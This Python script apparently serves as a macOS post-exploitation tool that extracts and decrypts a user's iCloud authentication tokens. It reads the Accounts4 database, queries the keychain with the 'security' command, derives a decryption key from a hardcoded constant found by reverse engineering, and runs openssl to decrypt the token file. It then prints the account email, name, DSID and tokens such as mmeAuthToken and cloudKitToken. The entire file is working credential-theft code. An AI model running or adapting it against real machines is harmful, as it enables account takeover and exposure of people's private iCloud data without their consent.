import base64
import hashlib
import hmac
import subprocess
import sys
import glob
import os
import binascii
import sqlite3
from Foundation import NSData, NSPropertyListSerialization

def bin2str(decryptedBinary):
    # convert the decrypted binary plist to an NSData object that can be read
    bin_list = NSData.dataWithBytes_length_(decryptedBinary, len(decryptedBinary))

    # convert the binary NSData object into a dictionary object
    token_plist = NSPropertyListSerialization.propertyListWithData_options_format_error_(bin_list,
                                                                                         0, None, None)[0]

    # accounts db cache
    if "$objects" in token_plist:
        # weird format, so we have to do some hacky parsing
        token_str = "{}".format(token_plist)
        pos_start = token_str.find("mmeBTMMInfiniteToken")
        
        # get first instance of $classes after mmeAuthToken
        pos_end = token_str[pos_start:].find("$classes")

        x = token_str[pos_start:pos_end + pos_start]
        l = [y.strip() for y in x.split(",")]

        # should be last in entry
        l = l[:(l.index("cloudKitToken") + 1) * 2]
        zipped = zip(l[:len(l) / 2 ], l[len(l) / 2:])
        
        for token in zipped:
            print("{}: {}\n".format(*token))

        exit()
    else:
        print("Successfully decrypted token plist!\n")
        print("{} [{} -> {}]".format(token_plist["appleAccountInfo"]["primaryEmail"],
                                     token_plist["appleAccountInfo"]["fullName"], 
                                     token_plist["appleAccountInfo"]["dsPrsID"]))
        print(token_plist["tokens"])
        exit()

def main():
    # try to find information in database first.
    conn = sqlite3.connect("{}/Library/Accounts/Accounts4.sqlite".format(os.path.expanduser("~")))
    curr = conn.cursor()
    data = curr.execute("SELECT * FROM ZACCOUNTPROPERTY WHERE ZKEY='AccountDelegate'")
    binaryPlist = data.fetchone()[5]

    # we got the plist
    if "{}".format(binaryPlist).startswith("bplist00"):
        print("Parsing tokens from cached Accounts4 file.\n")
        bin2str("{}".format(binaryPlist))

    # otherwise try by using keychain
    icloud_key = subprocess.Popen("security find-generic-password -ws "
                                  "'iCloud'", stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE, shell=True)

    stdout, stderr = icloud_key.communicate()

    if stderr:
        print("Error: {}. iCloud entry not found in keychain?".format(stderr))
        sys.exit()
    if not stdout:
        print("User clicked deny.")

    msg = base64.b64decode(stdout.replace("\n", ""))

    """
    Constant key used for hashing Hmac on all versions of MacOS.
    this is the secret to the decryption!
    /System/Library/PrivateFrameworks/AOSKit.framework/Versions/A/AOSKit
    yields the following subroutine
    KeychainAccountStorage _generateKeyFromData:
    that uses the below key that calls CCHmac to generate a Hmac that serves
    as the decryption key
    """

    key = "t9s\"lx^awe.580Gj%'ld+0LG<#9xa?>vb)-fkwb92[}"
    
    # create Hmac with this key and icloud_key using md5
    hashed = hmac.new(key, msg, digestmod=hashlib.md5).digest()
    
    # turn into hex for openssl subprocess
    hexed_key = binascii.hexlify(hashed)
    IV = 16 * '0'
    token_file = glob.glob("{}/Library/Application Support/iCloud/Accounts"
                           "/*".format(os.path.expanduser("~")))
    for x in token_file:
        try:
            #we can convert to int, that means we have the dsid file.
            int(x.split("/")[-1])
            token_file = x
        except ValueError:
            continue
    if not isinstance(token_file, str):
        print "Could not find MMeTokenFile. You can specify the file manually."
        sys.exit()
    else:
        print("Decrypting token plist -> [{}]\n".format(token_file))
    
    # perform decryption with zero dependencies by using openssl binary
    decrypted = subprocess.check_output("openssl enc -d -aes-128-cbc -iv '{}'"
                                        " -K {} < '{}'".format(IV, hexed_key,
                                                           token_file),
                                        shell=True)
    bin2str(decrypted)


if __name__ == "__main__":
    main()

